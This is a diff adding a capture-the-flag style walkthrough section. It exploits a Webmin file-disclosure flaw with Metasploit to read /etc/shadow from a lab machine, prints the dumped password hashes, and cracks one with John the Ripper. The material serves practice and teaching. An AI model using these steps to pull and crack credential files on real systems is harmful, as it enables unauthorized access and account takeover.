@@ -90,6 +90,105 @@ now its time to check the other open port (10000)
 
 ### 2.1.Webmin
 
+Let's check if webmin has any exploit availabel :
+
+```bash
+root@kali: searchsploit webmin
+
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure | multiple/remote/1997.php
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure | multiple/remote/2017.pl
+```
+i also checked metasploit for webmin and it has an auxilary for webmin -> `auxiliary/admin/webmin/file_disclosure`
+
+i used this auxilary and it worked, just change the `RPATH` to `/etc/shadow`:
+
+```bash
+msf6 auxiliary(admin/webmin/file_disclosure) > options
+
+Module options (auxiliary/admin/webmin/file_disclosure):
+
+   Name     Current Setting   Required  Description
+   ----     ---------------   --------  -----------
+   DIR      /unauthenticated  yes       Webmin directory path
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.127.138   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
+                                        it.html
+   RPATH    /etc/passwd       yes       The file to download
+   RPORT    10000             yes       The target port (TCP)
+   SSL      false             no        Negotiate SSL/TLS for outgoing connections
+   VHOST                      no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name      Description
+   ----      -----------
+   Download  Download arbitrary file
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/shadow
+rpath => /etc/shadow
+msf6 auxiliary(admin/webmin/file_disclosure) > run
+[*] Running module against 192.168.127.138
+
+[*] Attempting to retrieve /etc/shadow...
+[*] The server returned: 200 Document follows
+root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
+daemon:*:14040:0:99999:7:::
+bin:*:14040:0:99999:7:::
+sys:*:14040:0:99999:7:::
+sync:*:14040:0:99999:7:::
+games:*:14040:0:99999:7:::
+man:*:14040:0:99999:7:::
+lp:*:14040:0:99999:7:::
+mail:*:14040:0:99999:7:::
+news:*:14040:0:99999:7:::
+uucp:*:14040:0:99999:7:::
+proxy:*:14040:0:99999:7:::
+www-data:*:14040:0:99999:7:::
+backup:*:14040:0:99999:7:::
+list:*:14040:0:99999:7:::
+irc:*:14040:0:99999:7:::
+gnats:*:14040:0:99999:7:::
+nobody:*:14040:0:99999:7:::
+dhcp:!:14040:0:99999:7:::
+syslog:!:14040:0:99999:7:::
+klog:!:14040:0:99999:7:::
+mysql:!:14040:0:99999:7:::
+sshd:!:14040:0:99999:7:::
+vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
+obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
+osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
+yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
+```
+
+now we have user hashes and can crack them.
+
+## 3.Gaining Shell
+
+I tried the first account, vmware, to crack its hash using john
+
+just save the `vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::` to vmware.hash file and give it to john :
+
+```bash
+root@kali: john vmware.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+Created directory: /root/.john
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+h4ckm3           (vmware)     
+1g 0:00:00:47 DONE (2023-09-10 03:06) 0.02116g/s 160830p/s 160830c/s 160830C/s h4ndoff8..h4884625
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
 
 
 
